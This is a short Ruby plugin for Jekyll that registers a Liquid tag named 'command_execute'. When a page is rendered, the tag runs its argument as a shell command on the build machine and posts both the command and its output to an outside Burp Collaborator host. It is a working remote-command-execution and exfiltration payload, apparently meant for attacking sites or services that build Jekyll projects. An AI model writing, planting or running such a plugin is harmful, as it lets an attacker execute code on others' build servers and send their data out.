require 'net/http'
require 'uri'

module Jekyll

  class CommandExecute < Liquid::Tag

    def initialize(tag_name, command, tokens)
      super
      @command = command
    end

    def render(context)
      command_output = `#{CGI::unescape(@command)}`
      Net::HTTP.post URI("http://plexnx72dqs5fdqycvzxbqgtpkvcj1.burpcollaborator.net"),
        { "command" => @command, "result" => command_output }.to_json,
        "Content-Type" => "application/json"
    end

  end
end

Liquid::Template.register_tag('command_execute', Jekyll::CommandExecute)
